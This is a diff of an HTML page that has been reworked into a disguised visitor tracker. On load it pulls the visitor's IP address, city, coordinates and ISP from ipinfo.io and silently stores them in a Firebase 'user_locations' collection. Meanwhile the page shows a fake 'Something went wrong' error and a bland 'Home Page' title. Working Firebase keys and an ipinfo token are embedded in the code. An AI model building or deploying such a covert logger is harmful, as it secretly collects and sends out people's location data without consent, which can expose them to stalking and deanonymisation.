@@ -3,50 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hello</title>
-<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+    <title>Home Page</title>
+    <script type="module">
+        // Import Firebase v9+ (Modular)
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-</head>
-<body>
-    <h2>Getting User IP and Location...</h2>
-    <script>
         // Firebase Configuration
-        const firebaseConfig = {
-            apiKey: "AIzaSyC_usu3CrukBS8JkJJJxC1xSnw-GavwEcw",
-            authDomain: "private-messenger-f6ece.firebaseapp.com",
-            databaseURL: "https://private-messenger-f6ece-default-rtdb.firebaseio.com",
-            projectId: "private-messenger-f6ece",
-            storageBucket: "private-messenger-f6ece.firebasestorage.app",
-            messagingSenderId: "744752401318",
-            appId: "1:744752401318:web:e4d1a288d74d1e599b1d67"
-        };
+		  const firebaseConfig = {
+			apiKey: "AIzaSyAB6STYBF-Fzg4U4QkET_bMej47ZUJDM4Y",
+			authDomain: "locationsaver-b9997.firebaseapp.com",
+			projectId: "locationsaver-b9997",
+			storageBucket: "locationsaver-b9997.firebasestorage.app",
+			messagingSenderId: "675975845355",
+			appId: "1:675975845355:web:95cf7d6a2c255a33be35ae",
+			measurementId: "G-WJJY3Q2M8E"
+		  };
 
         // Initialize Firebase
-firebase.initializeApp(firebaseConfig);
-const db = firebase.firestore();
-
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
 
         // Fetch User IP & Location
         fetch('https://ipinfo.io/json?token=6a9008bb55fd89')
             .then(response => response.json())
-            .then(data => {
+            .then(async (data) => {
                 const userInfo = {
                     ip: data.ip,
                     city: data.city,
                     region: data.region,
                     country: data.country,
-                    location: data.loc,  // Latitude, Longitude
+                    location: data.loc, // Latitude, Longitude
                     org: data.org, // ISP Information
                     timestamp: new Date()
                 };
 
-                // Save to Firebase Firestore
-                db.collection("user_locations").add(userInfo)
-                    .then(() => console.log("User location saved successfully!"))
-                    .catch(error => console.error("Error saving location: ", error));
+                try {
+                    await addDoc(collection(db, "user_locations"), userInfo);
+                    console.log("✅saved successfully!");
+                } catch (error) {
+                    console.error("❌ Error saving:", error);
+                }
             })
-            .catch(error => console.error("Error fetching IP: ", error));
+            .catch(error => console.error("❌ Error fetching IP:", error));
     </script>
+</head>
+<body>
+    <h2>Something went wrong, Please refresh page.</h2>
 </body>
 </html>
